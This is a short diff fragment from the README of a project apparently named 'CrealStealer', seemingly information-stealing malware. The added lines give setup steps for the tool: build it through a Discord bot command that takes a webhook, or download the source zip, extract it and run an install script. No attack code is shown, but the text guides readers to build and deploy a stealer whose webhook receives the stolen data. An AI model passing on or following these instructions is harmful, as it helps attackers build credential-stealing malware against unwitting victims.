@@ -79,6 +79,10 @@
 
                                                       ⬇️ Setup
 
+   Go to our discord server and build with the command  `/build {webhook}`
+
+                                                     or
+
 1. [Download source code zip](https://github.com/leandrosanchs/CrealStealer/archive/refs/heads/main.zip)
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
